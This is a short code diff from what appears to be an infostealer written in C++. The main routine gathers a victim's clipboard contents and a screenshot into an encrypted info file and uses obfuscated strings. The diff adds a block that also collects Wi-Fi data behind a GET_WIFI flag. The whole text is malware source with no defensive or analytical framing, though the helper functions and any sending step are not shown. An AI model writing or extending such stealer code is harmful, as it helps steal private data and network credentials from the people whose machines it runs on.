@@ -122,6 +122,11 @@ int main(int argc, char* argv[])
         infoFileContent += aes_encrypt(KEY, getClipboard(), IV);
     infoFileContent += skCrypt("\n");
 
+    // wifi.txt;
+    if (GET_WIFI)
+        infoFileContent += aes_encrypt(KEY, getWifi(), IV);
+    infoFileContent += skCrypt("\n");
+
     // screenshot.bmp
     if (GET_SCREENSHOT)
         infoFileContent += aes_encrypt(KEY, getScreenshot(), IV);
